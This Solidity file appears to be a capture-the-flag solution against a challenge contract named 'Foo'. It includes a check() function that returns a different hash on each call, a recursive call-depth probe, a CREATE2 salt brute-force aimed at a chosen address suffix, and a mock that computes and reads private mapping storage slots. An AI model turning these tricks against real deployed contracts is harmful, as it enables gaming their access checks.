// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "hardhat/console.sol";

contract FooAttack {

    uint public times;
    function check() public view returns (bytes32) {
        if(times == 0) {
            return keccak256(abi.encodePacked("1337"));
        } else{
            return keccak256(abi.encodePacked("13337"));
        }
    }
    
    function stage2() external returns(uint256) {
        times = 0;
        uint tmp = this._stage2();
        console.log("final result: ", tmp);
        return tmp;
    }
    
    
    function _stage2() external payable returns (uint x) {
        times++;
        console.log(times, " times push stack");
        unchecked {
            x = 1;
            try this._stage2() returns (uint x_) {
                x += x_;
                console.log("times: ", times);
                console.log("last return val x_: ", x_, ", x: ", x);
            } catch {
                console.log("times: ", times, "catch exception, x: ", x);
            }
        }
    }
}

contract Helper {
     error NotFound();

     function deployAttack(bytes32 _salt) public returns(address) {
        FooAttack attack = new FooAttack{salt: _salt}(); 
        console.log("attack contract address: ", address(attack));
         return address(attack);
     }

     function calculateAddr() public view returns (bytes32) {
         //any word
         bytes32 salt = keccak256(abi.encodePacked("any code, any word"));
        for (uint i; i < 1000; i++) {
            // 计算合约地址方法 hash()
            address predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(
                    bytes1(0xff),
                    address(this),
                    salt,
                    keccak256(type(FooAttack).creationCode)
                )))));
            // console.log("predictedAddress: ", predictedAddress);哈哈哈哈ad
            if(uint256(uint160(predictedAddress)) % 1000 == 137) {
                console.log(i, " times ok, the correct address is: ", predictedAddress);
                return salt ;
            } else {
                salt = salt >> 1;
            }

            if (uint(salt) == 0) {
                salt = keccak256(abi.encodePacked(block.timestamp, block.number, i));
            }
        }
        revert NotFound();
    }
}

/**
 * @title 构造跟原合约同样的布局，以及相同的state variable及值，进而推算出原始合约某个
 * state variable的slot，曲线救国~
 * @author 
 * @notice 
 */
contract FooMock {
    address who;
    mapping (uint256 => mapping (address => bool)) stats;

    constructor() {}

    function setup(uint step, address _who) external {
        stats[step][_who] = true;
    }

    //获取account中指定key的槽位，按照keccak256(h(k) . p)的逻辑获取slot
    function getSlot(uint firstKey, address secondKey) external pure returns (uint) {
        uint firstSlot = uint(keccak256(abi.encode(uint256(firstKey), uint256(1))));
        uint secondSlot = uint(keccak256(abi.encode(address(secondKey), firstSlot)));
        return secondSlot;
    }

    function getValBySlot(uint slot) public view returns (bool val) {
        assembly {
            val := sload(slot)
        }
    }
}